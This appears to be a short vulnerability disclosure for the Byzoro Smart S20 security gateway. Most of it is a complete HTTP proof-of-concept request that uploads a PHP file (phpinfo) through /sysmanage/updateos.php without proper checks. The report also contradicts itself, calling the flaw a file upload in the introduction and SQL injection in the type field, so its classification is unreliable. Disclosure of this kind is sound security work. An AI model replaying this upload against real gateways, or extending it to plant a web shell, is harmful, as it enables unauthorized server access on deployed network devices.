Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet.
There is a file upload vulnerability in Byzro Networks Smart S20 multi-service security gateway intelligent management platform. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： https://www.byzoro.com/

version: S20

Vulnerability Path ：/ sysmanage/updateos.php


Vulnerability type： SQL injection

Vulnerability hazards：Attackers can exploit vulnerabilities to obtain sensitive database information

See the login page.

<img width="783" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/432049a0-e6fd-4b37-81f8-2cd705215e46">

POC：
```
POST /sysmanage/updateos.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=f5c3464dd3e747681934a5e5597ca58d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_file_upload"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—
```
<img width="783" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/354f5225-1f17-4046-9914-80a823fc2eaf">

<img width="783" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/08327829-dbad-4aca-ba79-0706c1d811d2">
